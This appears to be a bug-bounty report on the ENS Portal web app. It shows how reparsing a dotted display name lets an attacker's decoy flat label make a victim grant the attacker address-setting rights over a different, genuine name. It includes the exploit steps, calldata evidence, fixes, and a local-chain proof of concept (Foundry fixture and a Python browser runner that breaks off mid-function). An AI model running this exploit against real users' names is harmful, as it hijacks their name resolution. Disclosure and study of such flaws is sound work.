# 92110 w a high portal reparses a two dot raw label and authorizes a different four label ens name

**Submitted on Sep 7th 2026 at 09:08:55 UTC by @yaohao159123 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92110
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

### Evidence-led summary

One successful Portal Add User action produced one wallet request with selector `0xbbd9abb5`, role value `1`, and grantee `0x70997970C51812dc3A010C7d01b50e0d17dc79C8`. Although the victim selected the displayed flat-label object S, `alpha.beta.gamma.eth`, the request contained `0x05616c70686104626574610567616d6d610365746800`, the DNS packet for the victim's four-label hierarchical object T. The receipt succeeded, the attacker gained `ROLE_SET_ADDR` only on T, and an immediate attacker `setAddr(T)` changed T's resolved address. S remained unauthorized and unchanged.

Those measured facts follow from an identity-loss boundary in Portal. The resolver overview begins with an indexed ENSv2 node, but the selection and transaction state retain only its dotted display string. The grant helper gives that string to ENSJS, and Viem treats both interior dots as DNS label separators. Thus the application cannot preserve the raw label's boundary. An attacker can publicly register the single raw label `alpha.beta.gamma` under `.eth`, deliver that object to the victim, and associate it with the victim's resolver. Portal renders S with the same scalar as the separately owned hierarchy `alpha` below `beta.gamma.eth`; one ordinary victim confirmation then grants the attacker authority over T. The wrong resource is created by the application's transaction argument, not merely suggested by ambiguous text.

### Vulnerability Details

The governing invariant is object continuity: the typed registry/DNS object selected in the interface must be the object serialized into the wallet request. Text that happens to display identically is insufficient proof of identity because DNS boundaries are structural bytes. Portal violates this invariant after selection and before calldata construction.

#### Resource identity versus display equality

The collision is visible when the structural facts are compared directly:

| Evidence                                    | S: attacker-created decoy                        | T: victim's genuine name                         |
| ------------------------------------------- | ------------------------------------------------ | ------------------------------------------------ |
| Label structure                             | one raw label `alpha.beta.gamma` below `.eth`    | `alpha` below `beta.gamma.eth`                   |
| DNS wire bytes                              | `0x10616c7068612e626574612e67616d6d610365746800` | `0x05616c70686104626574610567616d6d610365746800` |
| Registry token, namehash, and role resource | distinct from T                                  | distinct from S                                  |
| Portal display scalar                       | `alpha.beta.gamma.eth`                           | `alpha.beta.gamma.eth`                           |

For S, both interior dots are label data. For T, both characters mark DNS boundaries. The indexer named by the target's end-to-end configuration constructs a displayed name as `label + "." + parent` and keys `names` rows by `(chain, namehash)`. It can therefore expose the flat object's distinct row with this shared spelling. This public-chain preparation does not make the indexer the vulnerable asset: the in-scope Portal is responsible for throwing away the row's typed identity before building the transaction.

#### Reconstructed exploit sequence

The attacker preparation consists only of paid public registrar operations over attacker-controlled state:

1. The victim already owns hierarchical T, `alpha.beta.gamma.eth`, and manages its active PermissionedResolver R.
2. Through the public `ETHRegistrar.commit()` and `register()` flow, the attacker registers the raw, single label `alpha.beta.gamma` under `.eth`, assigns S to the victim, and sets R as S's resolver.
3. The resolver overview's indexed row presents S as `alpha.beta.gamma.eth`.
4. The attacker asks the victim to provide Set Address Manager access for the delivered object.

The victim then follows the normal product path once:

5. While connected, the victim opens Roles, clicks Add User, supplies the attacker address, chooses the shown `alpha.beta.gamma.eth`, enables only Set Address Manager, and proceeds through the confirmation `Grant resolver roles for alpha.beta.gamma.eth`.
6. Portal calls `authorizeNameRoles(T_dns, ROLE_SET_ADDR, attacker, true)`, where `T_dns` is the hierarchical packet rather than S's flat packet.
7. The successful receipt gives the attacker the T role. The attacker can then invoke `setAddr` for T and point the genuine name at the attacker-controlled address.

This route needs no failed call, Retry action, race, stale index, hostile resolver, compromised key, pre-existing attacker privilege, or second victim interaction. Registration is preparation; the exploit-side user action is one documented Add User flow and one successful approval.

#### Identity-loss and serialization chain

The source establishes the failure as a continuous dataflow:

1. `apps/portal/src/features/resolver/hooks/useResolverOverview.ts:33-38` reduces each resolver node to `id`, `name`, `owner`, and `resolver`.
2. The query at `apps/portal/src/features/resolver/hooks/useResolverOverview.ts:75-85` does not request the available `labelName`, `labelhash`, `tokenId`, `canonicalId`, `normalizedName`, or `isNormalized` values. It also retains neither a registry address nor canonical DNS bytes.
3. `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx:127` types `selectedNode` as a string. At `:186`, it maps candidate nodes to `n.name`; at `:205`, it snapshots only `{ name, account, roles }`; at `:321`, it displays that scalar; and at `:327-334`, it sends the same scalar to the grant builder. By then, no label vector, token identity, registry address, role resource, or canonical packet can identify S.
4. `apps/portal/src/features/resolver/helpers/grantResolverRoles.ts:45-60` passes every non-empty selected string to ENSJS using `scope: 'name'`.
5. The pinned builder calls `packetToBytes(name)` at `apps/portal/node_modules/@ensdomains/ensjs/src/actions/wallet/v2/grantResolverRoles.ts:96-98`, then creates `authorizeNameRoles` at `:124-135`.
6. Viem's `apps/portal/node_modules/viem/utils/ens/packetToBytes.ts:38` splits on every interior dot. For `"alpha.beta.gamma.eth"`, it necessarily emits `0x05 alpha | 0x04 beta | 0x05 gamma | 0x03 eth | 0x00`, not `0x10 alpha.beta.gamma | 0x03 eth | 0x00`.
7. `packages/transaction-manager/src/actors/eoa-transport.actor.ts:52-60` forwards the prepared destination and data unchanged to the wallet.

The decisive transformation is therefore:

```
selected node object (flat label "alpha.beta.gamma" under .eth)
  -> retained as display string "alpha.beta.gamma.eth"
  -> packetToBytes("alpha.beta.gamma.eth") = alpha | beta | gamma | eth
  -> authorizeNameRoles(0x05616c70686104626574610567616d6d610365746800, ROLE_SET_ADDR, attacker, true)
  -> grant lands on the genuine hierarchical name T
```

#### Runtime evidence

The end-to-end run used the real frozen Portal UI and real contracts-v2 deployments on a local Anvil chain configured with the Sepolia chain ID; it made no Sepolia RPC writes. The target-provided mock-wallet connector established only the victim EOA. At the out-of-scope GraphQL boundary, the runner supplied the reviewed indexer behavior from its shipped schema and upsert SQL. Portal's interface, transaction helper, pinned ENSJS/Viem encoder, transaction manager, wallet RPC, mined receipt, resolver state, and attacker write all executed without transaction-logic patches.

The browser witness recorded:

```
displayed/selected object:  alpha.beta.gamma.eth (flat label S)
wallet requests sent:       1 (eth_sendTransaction)
captured calldata selector: 0xbbd9abb5 authorizeNameRoles(bytes,uint256,address,bool)
calldata DNS packet:        0x05616c70686104626574610567616d6d610365746800  (T: alpha | beta | gamma | eth)
calldata roles:             1 (ROLE_SET_ADDR)
calldata grantee:           0x70997970C51812dc3A010C7d01b50e0d17dc79C8 (attacker)
confirmation text:          Grant resolver roles for alpha.beta.gamma.eth
local transaction:          0x011ac464a5ba93b9ff316c122d012e71d44dd838b07217b4772e9ed2ca4295f7
receipt:                    success (0x1)
Portal page errors:         0
```

The wallet request byte-for-byte matched the mined transaction input. It included T's hierarchical packet and omitted S's flat packet. The terminal authorization results were:

| State                                        | Before victim approval | After successful receipt |
| -------------------------------------------- | ---------------------: | -----------------------: |
| Attacker `ROLE_SET_ADDR` on T (genuine name) |                  false |                     true |
| Attacker `ROLE_SET_ADDR` on S (flat decoy)   |                  false |                    false |
| Attacker `setAddr(T)`                        |                reverts |                 succeeds |
| `addr(T)`                                    |                      - |         attacker address |
| `addr(S)`                                    |                      - |                     zero |

The run used Portal commit `cda79acaad59711b943fc68207ebb3f1d0ff8596` and contracts-v2 commit `8d9dcca8a7703e5d15958d628c39579d3aa789e1`. The fixture created T through `ethRegistry -> gammaRegistry -> betaRegistry`, then the attacker used the public registrar to register S to the victim with the same resolver. This is a legal initial state: the attacker starts without a resolver role and cannot call `setAddr` on either object. The selected S packet was `0x10616c7068612e626574612e67616d6d610365746800`, while the captured and mined request carried T's four-label packet. Revoking T removed the attacker's write capability. A control grant using S's correct flat packet then authorized S alone and left T unauthorized.

#### Negative and positive controls

Two controls isolate the wrong DNS boundary from permissive resolver behavior:

1. Revoking the role on T causes the attacker's next `setAddr(T)` to revert, proving the attacker did not have default write permission.
2. Granting with S's correct flat DNS packet sets `ROLE_SET_ADDR` only on S, leaves T unauthorized, and enables an attacker write to S. The role implementation behaves correctly when it receives the intended packet.

Together, the pre-state, T-only delta, revocation, and correct-packet control attribute the capability transfer to Portal's reconstructed name argument.

#### Scope of the GraphQL substitution

The intercepted GraphQL response supplies only the external indexer row, matching the reviewed image's schema, `(chain, namehash)` upsert key, and `label + "." + parent` name construction. It neither fabricates the in-scope transformation nor changes transaction execution. Once Portal receives a row, all relevant layers run for real.

More importantly, a fully accurate indexer could return S and T as separate typed rows and this code path would still collapse both rows to the same `name` string. Because the selected value contains no typed identity, Portal cannot select S's canonical bytes at the grant boundary. The indexer provides attacker-created state; the Portal's lossy projection and reparsing create the wrong-resource authorization.

#### Remediation and regression requirements

The fix should preserve resource identity from query through wallet request:

1. Query and type a stable identity bundle for each resolver node, including registry address, token or canonical ID, raw label or label vector, namehash, resolver, and canonical DNS wire bytes.
2. Keep the selected object, or an opaque stable key resolving to it, instead of assigning `node.name` to selection state.
3. Construct authorization calldata from the selected object's canonical packet or resource; display text must never be reparsed into authority-bearing bytes.
4. Before confirmation and again before submission, verify that the typed object remains attached to the selected resolver and that any display round trip yields exactly the same packet.
5. Reject ambiguous and non-round-trippable records, and expose enough label/registry identity for same-spelled resources to be distinguished.
6. Add a regression fixture containing both the raw flat label `alpha.beta.gamma` and the hierarchy `alpha.beta.gamma.eth`. Selecting either must never authorize the other, and the test must compare the exact DNS packets rather than their shared display string.

### Impact Details

The recommended primary impact is **Malicious interactions with an already-connected wallet (modifying transaction arguments or parameters / submitting malicious transactions) - Critical**. The demonstrated terminal result also maps to **Subdomain takeover without already-connected wallet interaction - High**.

The Critical mapping follows from the transaction itself. The user selects S, while Portal constructs a request in which the authority-bearing DNS argument names T. This is an application-generated substitution of the authorization resource, delivered through the already-connected wallet. The visual string is not merely misunderstood: it is the lossy value Portal chose to transform, and that transformation changes the target bytes.

The High mapping follows from the measured post-state. Before approval, the attacker cannot write either object. After Portal's one successful transaction, the attacker alone receives `ROLE_SET_ADDR` on the victim's genuine T and can immediately redirect its resolution without another victim wallet action. No theft, NFT transfer, purchase made through incorrect resolution, or permanent irreversibility is asserted. The owner can revoke the role after discovery, but until then the exclusive attacker capability and immediate redirect are real, and the product gives no warning that the grant reached an object different from the selected one.

#### Distinction from public issue EXP-INPUT-005

The public description of `EXP-INPUT-005` concerns input validators that accept text later rejected or transformed by normalization, including homoglyphs, bidirectional/control characters, and a single leading or trailing dot. It characterizes the practical consequence as homograph-like display confusion rather than incorrect resolution. This report has a different ingress, root, sink, and demonstrated result:

| Dimension                | Public EXP-INPUT-005                                           | This report                                                                                                |
| ------------------------ | -------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| Entry point              | validator accepts deceptive name text                          | victim opens an already-registered on-chain object in Resolver Roles; no name-input validator participates |
| Character condition      | homoglyph, bidi/control character, or one leading/trailing dot | interior dot bytes inside one raw on-chain label, later interpreted as DNS separators                      |
| Root failure             | validation disagrees with normalization                        | typed node identity is discarded and display text is reparsed as a different object                        |
| Security sink            | confusing UI rendering                                         | successful `authorizeNameRoles` call against another authorization resource                                |
| Terminal outcome         | publicly limited to display confusion                          | attacker gains `ROLE_SET_ADDR` over the genuine name and redirects it                                      |
| Narrow corrective action | align the validator and normalizer or reject the text          | maintain typed object identity through calldata; never derive the resource from display text               |

The private `EXP-INPUT-005` ticket and any non-public fix are unavailable, so this comparison is necessarily limited to the program's public statement. The same limitation prevents a guarantee that no private report has overlapping breadth.

### References and source state

Scope and revision facts:

* In-scope asset: `apps/portal` (Explorer app / Websites & Apps).
* Frozen competition revision used by the PoC: `cda79acaad59711b943fc68207ebb3f1d0ff8596`.
* Public `audit-comp-ready` head reviewed on 2026-08-27: `1c9b47f18fcddd2e864dfe385c4171061c9811ae`.
* The public changes after the frozen revision are limited to Hono/package-manifest and lockfile updates; no public typed-identity or grant-builder correction is present.
* The executed frozen copies of `useResolverOverview.ts`, `ResolverAddUserSheet.tsx`, `grantResolverRoles.ts`, and the ENSJS grant builder match the competition source.

Links:

* Program scope: <https://immunefi.com/audit-competition/audit-competition-ens/scope/>
* In-scope Portal: <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* Resolver overview query/model: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/hooks/useResolverOverview.ts>
* Add User sheet (selection, confirmation, dispatch): <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx>
* Grant helper: <https://github.com/immunefi-team/audit-comp-ens/blob/audit-comp-ready/apps/portal/src/features/resolver/helpers/grantResolverRoles.ts>
* Transaction manager (in-scope package): <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/transaction-manager>

## Proof of Concept

### Proven properties

The executable source embedded in this report drives the unmodified frozen Portal through one ordinary Add User operation against real contracts-v2 deployments on an isolated Anvil chain. The selected object S is one raw label, `alpha.beta.gamma`, under `.eth`; the genuine target T is the hierarchy `alpha | beta | gamma | eth`. Portal displays both structures as `alpha.beta.gamma.eth`.

The run proves every decisive boundary in one trace: the victim selects S and only Set Address Manager; Portal emits exactly one wallet request; the request carries T's DNS packet rather than S's; the local transaction succeeds; only T gains the attacker's role; and the attacker immediately exercises that role against T. Revocation removes the capability, while a correct-flat-packet control authorizes only S.

No Sepolia transaction is broadcast, no production user or site is contacted, and no real user key is used. The local chain uses Sepolia's chain ID solely because Portal enforces that network identifier.

### Reproduction steps and environment

Prerequisites are macOS or Linux; Git; Foundry (`anvil`, `forge`, and `cast`); Node 22 with pnpm 10; Python 3; and Playwright with Chromium. The only source dependencies are the two official repositories and exact revisions shown below. The four bundle files used by the run are all embedded in this report: `setup-foundry-toml.sh`, `foundry.toml.template`, `script/DeployDottedPortalFixture.s.sol`, and `run_continuous_portal_anvil.py`.

Save the four embedded files with those relative names, then run these commands from the directory containing them:

```bash
git clone https://github.com/immunefi-team/audit-comp-ens.git audit-comp-ens
git -C audit-comp-ens checkout --detach cda79acaad59711b943fc68207ebb3f1d0ff8596
pnpm --dir audit-comp-ens install --frozen-lockfile

git clone https://github.com/ensdomains/contracts-v2.git contracts-v2
git -C contracts-v2 checkout --detach 8d9dcca8a7703e5d15958d628c39579d3aa789e1
git -C contracts-v2 submodule update --init --recursive

python3 -m venv .venv
.venv/bin/python -m pip install playwright
.venv/bin/python -m playwright install chromium

chmod +x setup-foundry-toml.sh
CONTRACTS_V2_ROOT="$PWD/contracts-v2/contracts" ./setup-foundry-toml.sh
ENS_FROZEN_SOURCE_ROOT="$PWD/audit-comp-ens"   .venv/bin/python run_continuous_portal_anvil.py
```

`CONTRACTS_V2_ROOT` must contain the contracts-v2 `src/` and `lib/` directories. `ENS_FROZEN_SOURCE_ROOT` must contain `apps/portal`. The runner resolves `anvil`, `forge`, `cast`, and pnpm from `PATH`; optional `ANVIL_BIN`, `FORGE_BIN`, `CAST_BIN`, `NODE_BIN_DIR`, and `CHROMIUM_BIN` values may override those executable locations. It reserves dynamic localhost ports, creates its own artifact directory, and terminates Portal and Anvil on exit.

The setup helper is complete:

```bash
#!/usr/bin/env bash
# Generate foundry.toml for the PoC project from foundry.toml.template.
# CONTRACTS_V2_ROOT must point at the `contracts/` directory inside a
# contracts-v2 checkout (the tree that contains src/ and lib/).
set -euo pipefail

if [[ -z "${CONTRACTS_V2_ROOT:-}" ]]; then
  echo "set CONTRACTS_V2_ROOT to the contracts/ directory of a contracts-v2 checkout" >&2
  echo 'example: CONTRACTS_V2_ROOT="$PWD/contracts-v2/contracts" ./setup-foundry-toml.sh' >&2
  exit 1
fi

if [[ ! -d "${CONTRACTS_V2_ROOT}/src" || ! -d "${CONTRACTS_V2_ROOT}/lib" ]]; then
  echo "CONTRACTS_V2_ROOT must contain src/ and lib/ (got: ${CONTRACTS_V2_ROOT})" >&2
  exit 1
fi

sed "s|{{CONTRACTS_V2_ROOT}}|${CONTRACTS_V2_ROOT}|g" foundry.toml.template > foundry.toml
echo "wrote foundry.toml for CONTRACTS_V2_ROOT=${CONTRACTS_V2_ROOT}"
```

The corresponding Foundry template is complete:

```toml
[profile.default]
src = "src"
test = "test"
out = "out"
cache_path = "cache"
libs = ["{{CONTRACTS_V2_ROOT}}/lib"]
evm_version = "cancun"
optimizer = true
optimizer_runs = 200
fs_permissions = [{ access = "read-write", path = "./artifacts" }]
remappings = [
  "~src/={{CONTRACTS_V2_ROOT}}/src/",
  "~test/={{CONTRACTS_V2_ROOT}}/test/",
  "forge-std/={{CONTRACTS_V2_ROOT}}/lib/forge-std/src/",
  "@openzeppelin/contracts/={{CONTRACTS_V2_ROOT}}/lib/openzeppelin-contracts/contracts/",
  "@openzeppelin/contracts-upgradeable/={{CONTRACTS_V2_ROOT}}/lib/openzeppelin-contracts-upgradeable/contracts/",
  "@openzeppelin/contracts-v5/={{CONTRACTS_V2_ROOT}}/lib/openzeppelin-contracts/contracts/",
  "@ens/contracts/={{CONTRACTS_V2_ROOT}}/lib/ens-contracts/contracts/",
  "@ens/contracts/utils/LibMem/={{CONTRACTS_V2_ROOT}}/src/utils/",
  "@ensdomains/buffer/={{CONTRACTS_V2_ROOT}}/lib/buffer/",
  "@ensdomains/verifiable-factory/={{CONTRACTS_V2_ROOT}}/lib/verifiable-factory/src/",
  "@unruggable/gateways/={{CONTRACTS_V2_ROOT}}/lib/unruggable-gateways/",
  "solady/={{CONTRACTS_V2_ROOT}}/lib/solady/src/",
  "{{CONTRACTS_V2_ROOT}}/lib/ens-contracts/:@openzeppelin/contracts/={{CONTRACTS_V2_ROOT}}/lib/openzeppelin-contracts-v4/contracts/",
  "{{CONTRACTS_V2_ROOT}}/lib/ens-contracts/:@ensdomains/solsha1/contracts/={{CONTRACTS_V2_ROOT}}/lib/solsha1/contracts/",
  "{{CONTRACTS_V2_ROOT}}/lib/ens-contracts/:@unruggable/gateways/={{CONTRACTS_V2_ROOT}}/lib/unruggable-gateways/contracts/"
]
```

### Assertion oracles

Any failed invariant makes the runner exit non-zero and retain a failure result. A complete run prints `status: PASS`. Its stable acceptance oracles are:

```
selected/displayed object = alpha.beta.gamma.eth (flat S)
selected S DNS packet = 0x10616c7068612e626574612e67616d6d610365746800
wallet/mined T packet = 0x05616c70686104626574610567616d6d610365746800
wallet eth_sendTransaction count = 1
Portal page errors = 0
receipt status = 0x1
before.nestedRole = false
before.flatRole = false
before.attackerSetAddrDenied = true
afterPortal.nestedRole = true
afterPortal.flatRole = false
afterPortal.nestedAddr = attacker
afterPortal.flatAddr = zero
controls.setAddrDeniedAfterRevoke = true
controls.nestedRoleAfterFlatGrant = false
controls.flatRoleAfterFlatGrant = true
```

The captured wallet request must byte-equal the transaction input mined by Anvil. It must contain T's packet and exclude S's packet. The role and address controls must isolate the capability to the exact packet granted.

### Execution result

The structure-fixed bundle was rerun from the embedded source. It returned `status: PASS`, emitted one wallet request, produced no Portal page errors, and mined local transaction `0x011ac464a5ba93b9ff316c122d012e71d44dd838b07217b4772e9ed2ca4295f7` with receipt status `0x1` in block `0x16`.

Before Portal, the attacker held no Address role on S or T and `setAddr(T)` reverted. After Portal, T's role was `true`, S's role remained `false`, `addr(T)` equaled the attacker address, and `addr(S)` remained zero. Revocation restored denial. Granting the correct S packet then made only S writable and left T unauthorized.

The five screenshots cover the Roles page, S selection with only Set Address Manager, transaction overview, confirmation text `Grant resolver roles for alpha.beta.gamma.eth`, and successful completion. The machine-readable witness is `continuous-result.json`; `fixture.json` and `flat-registration-receipt.json` record the object construction and public registration.

The complete Foundry deployment fixture is:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";

import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {ETHRegistrar} from "~src/registrar/ETHRegistrar.sol";
import {
    DiscountPoint,
    PaymentRatio,
    StandardRentPriceOracle
} from "~src/registrar/StandardRentPriceOracle.sol";
import {PermissionedRegistry} from "~src/registry/PermissionedRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";
import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
import {IContractNamer} from "~src/reverse-registrar/interfaces/IContractNamer.sol";
import {LabelStore} from "~src/utils/LabelStore.sol";
import {MockERC20} from "~test/mocks/MockERC20.sol";

contract DeployDottedPortalFixture is Script {
    string internal constant FLAT_LABEL = "alpha.beta.gamma";
    string internal constant NESTED_NAME = "alpha.beta.gamma.eth";

    address internal victim;
    address internal attacker;
    PermissionedRegistry internal ethRegistry;
    PermissionedRegistry internal gammaRegistry;
    PermissionedRegistry internal betaRegistry;
    PermissionedResolver internal resolver;
    ETHRegistrar internal registrar;
    MockERC20 internal paymentToken;
    uint256 internal genuineTokenId;
    uint256 internal flatBaseId;
    uint256 internal flatResource;
    uint256 internal nestedResource;
    bytes internal flatDns;
    bytes internal nestedDns;
    bytes32 internal flatNode;
    bytes32 internal nestedNode;
    bytes32 internal commitment;
    bytes32 internal secret;
    uint64 internal duration;

    function run() external {
        uint256 victimKey = vm.envUint("VICTIM_PRIVATE_KEY");
        uint256 attackerKey = vm.envUint("ATTACKER_PRIVATE_KEY");
        victim = vm.addr(victimKey);
        attacker = vm.addr(attackerKey);

        vm.startBroadcast(victimKey);
        _deployNames();
        _deployRegistrar();
        vm.stopBroadcast();

        vm.startBroadcast(attackerKey);
        paymentToken.approve(address(registrar), type(uint256).max);
        vm.stopBroadcast();

        _prepareFixtureValues();
        _writeFixture();
    }

    function _deployNames() internal {
        LabelStore labelStore = new LabelStore(IContractNamer(address(0)));
        ethRegistry = new PermissionedRegistry(labelStore, victim, EACBaseRolesLib.ALL_ROLES);
        gammaRegistry = new PermissionedRegistry(labelStore, victim, EACBaseRolesLib.ALL_ROLES);
        betaRegistry = new PermissionedRegistry(labelStore, victim, EACBaseRolesLib.ALL_ROLES);
        gammaRegistry.setParent(ethRegistry, "gamma");
        betaRegistry.setParent(gammaRegistry, "beta");

        VerifiableFactory factory = new VerifiableFactory();
        PermissionedResolver implementation = new PermissionedResolver(victim);
        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize,
            (victim, EACBaseRolesLib.ALL_ROLES, new bytes[](0))
        );
        resolver = PermissionedResolver(
            factory.deployProxy(address(implementation), uint256(keccak256(initData)), initData)
        );

        uint64 expiry = uint64(block.timestamp + 365 days);
        ethRegistry.register(
            "gamma",
            victim,
            gammaRegistry,
            address(resolver),
            EACBaseRolesLib.ALL_ROLES,
            expiry
        );
        gammaRegistry.register(
            "beta",
            victim,
            betaRegistry,
            address(resolver),
            EACBaseRolesLib.ALL_ROLES,
            expiry
        );
        genuineTokenId = betaRegistry.register(
            "alpha",
            victim,
            IRegistry(address(0)),
            address(resolver),
            EACBaseRolesLib.ALL_ROLES,
            expiry
        );
    }

    function _deployRegistrar() internal {
        paymentToken = new MockERC20("Payment", 18);
        uint256[] memory baseRates = new uint256[](1);
        baseRates[0] = 1;
        DiscountPoint[] memory discounts = new DiscountPoint[](0);
        PaymentRatio[] memory paymentRatios = new PaymentRatio[](1);
        paymentRatios[0] = PaymentRatio(paymentToken, 1, 1);
        StandardRentPriceOracle oracle = new StandardRentPriceOracle(
            victim,
            baseRates,
            discounts,
            1,
            1,
            1,
            1,
            paymentRatios
        );

        registrar = new ETHRegistrar(victim, ethRegistry, victim, oracle, 0, 1, 100, 1);
        ethRegistry.grantRootRoles(
            RegistryRolesLib.ROLE_REGISTRAR | RegistryRolesLib.ROLE_RENEW,
            address(registrar)
        );
        paymentToken.mint(attacker, type(uint128).max);
    }

    function _prepareFixtureValues() internal {
        secret = keccak256("continuous-two-dot-flat-decoy-seed");
        duration = 365 days;
        commitment = registrar.makeCommitment(
            FLAT_LABEL,
            victim,
            secret,
            IRegistry(address(0)),
            address(resolver),
            duration,
            bytes32(0)
        );

        flatDns = abi.encodePacked(
            uint8(bytes(FLAT_LABEL).length), FLAT_LABEL, uint8(3), "eth", uint8(0)
        );
        nestedDns = NameCoder.encode(NESTED_NAME);
        flatNode = NameCoder.namehash(flatDns, 0);
        nestedNode = NameCoder.namehash(nestedDns, 0);
        flatBaseId = uint256(keccak256(bytes(FLAT_LABEL)));
        flatResource = PermissionedResolverLib.resource(flatNode, bytes32(0));
        nestedResource = PermissionedResolverLib.resource(nestedNode, bytes32(0));
    }

    function _writeFixture() internal {
        string memory objectKey = "fixture";
        vm.serializeAddress(objectKey, "victim", victim);
        vm.serializeAddress(objectKey, "attacker", attacker);
        vm.serializeAddress(objectKey, "ethRegistry", address(ethRegistry));
        vm.serializeAddress(objectKey, "gammaRegistry", address(gammaRegistry));
        vm.serializeAddress(objectKey, "betaRegistry", address(betaRegistry));
        vm.serializeAddress(objectKey, "resolver", address(resolver));
        vm.serializeAddress(objectKey, "registrar", address(registrar));
        vm.serializeAddress(objectKey, "paymentToken", address(paymentToken));
        vm.serializeUint(objectKey, "genuineTokenId", genuineTokenId);
        vm.serializeUint(objectKey, "flatBaseId", flatBaseId);
        vm.serializeUint(objectKey, "flatResource", flatResource);
        vm.serializeUint(objectKey, "nestedResource", nestedResource);
        vm.serializeBytes(objectKey, "flatDns", flatDns);
        vm.serializeBytes(objectKey, "nestedDns", nestedDns);
        vm.serializeBytes32(objectKey, "flatNode", flatNode);
        vm.serializeBytes32(objectKey, "nestedNode", nestedNode);
        vm.serializeUint(objectKey, "duration", duration);
        vm.serializeBytes32(objectKey, "commitment", commitment);
        string memory json = vm.serializeBytes32(objectKey, "secret", secret);
        vm.writeJson(json, vm.envString("FIXTURE_JSON_PATH"));
    }
}
```

The complete Portal/Anvil/browser runner is:

```python
#!/usr/bin/env python3
"""Run the real Portal Add User flow against an isolated contracts-v2 fixture."""

from __future__ import annotations

import hashlib
import json
import os
import socket
import shutil
import subprocess
import sys
import time
import traceback
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from playwright.sync_api import Page, Route, sync_playwright


POC_ROOT = Path(__file__).resolve().parent


def _require_env_path(name: str) -> Path:
    value = os.environ.get(name)
    if not value:
        raise SystemExit(
            f"set {name} to the frozen competition source checkout "
            "(the tree that contains apps/portal)"
        )
    return Path(value).expanduser().resolve()


def _tool(name: str, env_name: str) -> Path:
    override = os.environ.get(env_name)
    if override:
        return Path(override).expanduser()
    found = shutil.which(name)
    if not found:
        raise SystemExit(f"{name} not found on PATH; set {env_name}")
    return Path(found)


FROZEN_ROOT = _require_env_path("ENS_FROZEN_SOURCE_ROOT")
PORTAL_ROOT = FROZEN_ROOT / "apps/portal"

ANVIL = _tool("anvil", "ANVIL_BIN")
FORGE = _tool("forge", "FORGE_BIN")
CAST = _tool("cast", "CAST_BIN")
PNPM = "pnpm"
ARM64_NODE_BIN = (
    Path(os.environ["NODE_BIN_DIR"]).expanduser()
    if os.environ.get("NODE_BIN_DIR")
    else None
)
CHROMIUM_BIN = (
    Path(os.environ["CHROMIUM_BIN"]).expanduser()
    if os.environ.get("CHROMIUM_BIN")
    else None
)

MNEMONIC = "test test test test test test test test test test test junk"
VICTIM_KEY = (
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
)
ATTACKER_KEY = (
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"
)
ZERO_ADDRESS = "0x0000000000000000000000000000000000000000"
ZERO_BYTES32 = "0x" + "00" * 32
ROLE_SET_ADDR = 1


def reserve_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def run_command(
    args: list[str],
    *,
    cwd: Path | None = None,
    env: dict[str, str] | None = None,
    check: bool = True,
    timeout: int = 180,
) -> subprocess.CompletedProcess[str]:
    completed = subprocess.run(
        args,
        cwd=str(cwd) if cwd else None,
        env=env,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=False,
    )
    if check and completed.returncode != 0:
        raise RuntimeError(
            f"command failed ({completed.returncode}): {args[0]}\n{completed.stdout}"
        )
    return completed


def rpc(rpc_url: str, method: str, params: list[Any] | None = None) -> Any:
    body = json.dumps(
        {"jsonrpc": "2.0", "id": 1, "method": method, "params": params or []}
    ).encode()
    request = urllib.request.Request(
        rpc_url,
        data=body,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=10) as response:
        payload = json.loads(response.read())
    if payload.get("error"):
        raise RuntimeError(f"RPC {method} failed: {payload['error']}")
    return payload.get("result")


def wait_for_rpc(rpc_url: str, process: subprocess.Popen[Any], timeout: int = 30) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if process.poll() is not None:
            raise RuntimeError("Anvil exited before becoming ready")
        try:
            rpc(rpc_url, "eth_chainId")
            return
        except Exception:
            time.sleep(0.2)
    raise TimeoutError(f"Anvil did not become ready at {rpc_url}")


def wait_for_http(url: str, process: subprocess.Popen[Any], timeout: int = 90) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        if process.poll() is not None:
            raise RuntimeError("Portal exited before becoming ready")
        try:
            with urllib.request.urlopen(url, timeout=2) as response:
                if response.status < 500:
                    return
        except Exception:
            time.sleep(0.3)
    raise TimeoutError(f"Portal did not become ready at {url}")


def cast_call(
